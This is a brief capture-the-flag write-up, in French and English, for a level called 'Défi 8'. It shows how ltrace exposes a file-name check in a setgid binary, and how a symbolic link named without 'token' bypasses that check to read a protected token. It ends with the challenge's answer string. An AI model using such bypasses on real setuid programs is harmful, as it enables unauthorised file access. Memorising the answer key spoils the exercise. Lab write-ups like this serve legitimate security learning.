## Défi 8  ltrace + Symbolic Link 

### Commandes réalisées
```bash
cat level08
./level08
./level08 token
ltrace ./level08 token
ln -s $PWD/token /tmp/symlink
./level08 /tmp/symlink
```
### The Outputs

* Str check is made on the file, **on vérifie si le mot token est dans le nom du fichier**

* When **setgid** is applied to an **executable file**, it allows the file to be **executed with the permissions of the group** associated with the file
=> Créons un **symlink sans le mot token** dans le nom de fichier

### Exploit
```bash
ln -s $(realpath token) /tmp/symlink # Général
ln -s $PWD/token /tmp/symlink
su flag08
```

### Answer : quif5eloekouj29ke0vouxean